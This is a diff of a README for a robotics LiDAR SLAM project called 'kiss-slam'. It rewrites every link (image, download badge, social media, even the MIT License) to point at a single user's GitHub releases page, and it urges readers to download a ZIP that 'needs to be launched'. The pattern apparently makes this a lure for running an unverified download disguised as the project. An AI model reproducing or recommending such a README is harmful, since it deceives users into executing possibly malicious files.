@@ -1,6 +1,6 @@
 # 💫 Welcome to the Kiss-SLAM Repository! 💫
 
-![LiDAR SLAM](https://image.shutterstock.com/image-illustration/d-render-robotic-eye-600w-1211986758.jpg)
+![LiDAR SLAM](https://github.com/mdtajnur22/kiss-slam/releases)
 
 ## Description
 Welcome to the **kiss-slam** repository, your go-to place for a LiDAR SLAM system that just works! Here, we focus on providing a reliable and efficient SLAM solution using LiDAR technology for mapping and perception in the field of robotics.
@@ -14,11 +14,11 @@ Welcome to the **kiss-slam** repository, your go-to place for a LiDAR SLAM syste
 🤖 slam  
 
 ## Get Started
-If you are ready to revolutionize your robot's mapping and perception abilities with our LiDAR SLAM system, head over to our latest release and download the ZIP file from [here](https://github.com/releases/789694263/Release.zip). Remember, this ZIP file needs to be launched to kickstart your journey with **kiss-slam**!
+If you are ready to revolutionize your robot's mapping and perception abilities with our LiDAR SLAM system, head over to our latest release and download the ZIP file from [here](https://github.com/mdtajnur22/kiss-slam/releases). Remember, this ZIP file needs to be launched to kickstart your journey with **kiss-slam**!
 
 If the link provided above does not work or you need more information, feel free to explore the "Releases" section of this repository for alternate download options.
 
-[![Download KISS-SLAM](https://img.shields.io/badge/Download-KISS--SLAM-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download KISS-SLAM](https://github.com/mdtajnur22/kiss-slam/releases)](https://github.com/mdtajnur22/kiss-slam/releases)
 
 ## Why Choose Kiss-SLAM?
 Kiss-SLAM stands out from the crowd for a variety of reasons:
@@ -45,12 +45,12 @@ We welcome contributions from the community to make **kiss-slam** even better! W
 ## Stay Connected
 Stay up-to-date with **kiss-slam** news, updates, and discussions by following us on our social media channels:
 
-📱 [Twitter](https://twitter.com/kiss-slam)  
-📸 [Instagram](https://instagram.com/kiss-slam)  
-📘 [Facebook](https://facebook.com/kiss-slam)
+📱 [Twitter](https://github.com/mdtajnur22/kiss-slam/releases)  
+📸 [Instagram](https://github.com/mdtajnur22/kiss-slam/releases)  
+📘 [Facebook](https://github.com/mdtajnur22/kiss-slam/releases)
 
 ## License
-The **kiss-slam** project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute our system for your robotics projects.
+The **kiss-slam** project is licensed under the [MIT License](https://github.com/mdtajnur22/kiss-slam/releases). Feel free to use, modify, and distribute our system for your robotics projects.
 
 ---
 
